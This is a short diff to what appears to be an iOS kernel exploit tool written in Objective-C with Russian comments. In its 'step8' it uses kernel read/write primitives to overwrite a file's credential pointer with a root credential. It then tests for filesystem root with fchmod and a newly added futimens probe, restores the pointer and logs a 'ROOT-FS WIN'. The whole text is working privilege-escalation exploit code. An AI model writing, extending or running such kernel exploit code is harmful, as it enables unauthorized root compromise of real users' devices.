@@ -2380,11 +2380,18 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             uint64_t old = early_kread64(glob + fgOff);
             early_kwrite64(glob + fgOff, rootZVA);
             uint64_t rb = early_kread64(glob + fgOff);
-            int ch = fchmod(tfd, 0644);   // одна проба, мгновенно
+            int ch = fchmod(tfd, 0644);
+            int eCh = errno;
+            // 2.0.87: ОДИН новый syscall — futimens. Если f_cred ест — 0.
+            struct timespec ts[2]; ts[0].tv_sec = 0; ts[0].tv_nsec = UTIME_NOW;
+            ts[1].tv_sec = 0; ts[1].tv_nsec = UTIME_NOW;
+            int fu = futimens(tfd, ts);
+            int eFu = errno;
             early_kwrite64(glob + fgOff, old);   // restore СРАЗУ
-            kpNote(r, [NSString stringWithFormat:@"  [ATK] step8: fg swap readback=%#llx → fchmod=%d errno=%d → restored — %@",
-                      (unsigned long long)rb, ch, errno, ch == 0 ? @"ROOT-FS WIN ★★" : @"проба мимо (process-cred авторизация)"]);
-            if (ch == 0) kpNote(r, @"=== ROOT (filesystem) WIN ===");
+            kpNote(r, [NSString stringWithFormat:@"  [ATK] step8: fg swap readback=%#llx → fchmod=%d/e%d futimens=%d/e%d → restored — %@",
+                      (unsigned long long)rb, ch, eCh, fu, eFu,
+                      (ch == 0 || fu == 0) ? @"ROOT-FS WIN ★★" : @"пробы мимо (process-cred)"]);
+            if (ch == 0 || fu == 0) kpNote(r, @"=== ROOT (filesystem) WIN ===");
         } else {
             kpNote(r, @"  [ATK] step8: SKIPPED — type!=0x21, kwrite запрещён (апертура-фолт = ребут)");
         }
